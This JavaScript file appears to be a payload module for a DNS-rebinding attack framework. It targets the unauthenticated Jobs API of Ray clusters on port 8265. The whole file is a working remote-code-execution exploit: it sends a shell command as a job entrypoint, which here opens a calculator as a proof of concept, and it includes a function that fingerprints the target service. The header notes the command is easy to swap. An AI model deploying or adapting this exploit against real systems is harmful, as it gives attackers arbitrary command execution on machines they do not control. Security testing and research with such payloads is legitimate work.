/**
 * This payload exploits Ray (https://github.com/ray-project/ray)
 * It opens the "Calculator" application on various operating systems.
 * The payload can be easily modified to target different OSes or implementations.
 * The TCP port attacked is 8265.
 */

const RayRce = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        // Get the current timestamp in milliseconds
        const timestamp = Date.now();
        
        // OS-agnostic calculator command that tries multiple approaches
        const calculatorCommand = `
            # Try Windows calculator first
            if command -v calc.exe >/dev/null 2>&1; then
                echo Windows calculator launching
                calc.exe &
            # Try macOS calculator
            elif command -v open >/dev/null 2>&1; then
                echo macOS calculator launching
                open -a Calculator &
            elif [ -f "/System/Applications/Calculator.app/Contents/MacOS/Calculator" ]; then
                echo macOS calculator launching
                /System/Applications/Calculator.app/Contents/MacOS/Calculator &
            # Try Linux calculators
            elif command -v gnome-calculator >/dev/null 2>&1; then
                echo Linux calculator launching
                gnome-calculator &
            elif command -v kcalc >/dev/null 2>&1; then
                echo Linux calculator launching
                kcalc &
            elif command -v xcalc >/dev/null 2>&1; then
                echo Linux calculator launching
                xcalc &
            # Fallback: try to find any calculator binary
            else
                echo Linux calculator launching
                find /usr/bin /usr/local/bin /opt -name "*calc*" -type f -executable 2>/dev/null | head -1 | xargs -I {} {} &
            fi
            echo RAY RCE: ${timestamp}
        `;
        
        const data = {
            "entrypoint": calculatorCommand,
            "runtime_env": {},
            "job_id": null,
            "metadata": {
                "job_submission_id": timestamp.toString(),
                "source": "nccgroup/singluarity"
            }
        };
        
        sooFetch('/api/jobs/', {
            method: 'POST',
            headers: {
                'User-Agent': 'Other',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            console.log(response);
            return response.json()
        }) // parses JSON response into native JavaScript objects
        .then(data => {
            console.log('Success:', data);
        })
        .catch((error) => {
            console.error('Error:', error);
        });
    }
    
    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return sooFetch("/",{
            mode: 'no-cors',
            credentials: 'omit',
        })
        .then(function (response) {
            return response.text()
        })
        .then(function (d) {
            if (d.includes("You need to enable JavaScript")) {
                return true;
            } else {
                return false;
            }
        })
        .catch(e => { return false; })
    }

    return {
        attack,
        isService
    }
}

Registry["Ray Jobs RCE"] = RayRce();
